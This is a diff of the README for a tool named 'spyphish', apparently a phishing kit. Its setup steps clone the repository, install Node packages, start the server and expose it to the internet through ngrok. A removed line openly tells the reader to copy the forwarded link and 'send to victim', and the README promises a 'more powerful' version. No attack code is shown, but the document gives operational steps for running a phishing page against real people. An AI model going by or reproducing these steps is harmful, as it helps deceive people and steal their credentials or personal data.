@@ -1,28 +1,25 @@
 # spyphish
 
-stpe 1: 
-        install node on your device
+step 1: 
+        Installl node on your device
 
 step 2:
-        install requirement.txt 
+
+        git clone https://github.com/spyvictim/spyphish.git
+        cd spyphish
+        npm i express qrcode ejs 
+        npm i nodemailer
+        node index.js
 
 step 3:
-        start server
+        Install ngrok on your device from the  official site
+
+        https://ngrok.com/
+
+step 4: 
+        config ngrok and run it on port 8080
         
-        command:   node index.js
-        
-step 4:
-
-        install ngrok for port forwarding
-
-step 5:
-
-        run ngrok on same port 
-
-step 6:
-
-        copy forwarded link and send to victim 
 
 
 
-wait for updated version release soon. which is more powerful
+wait for the updated version. which is more powerful
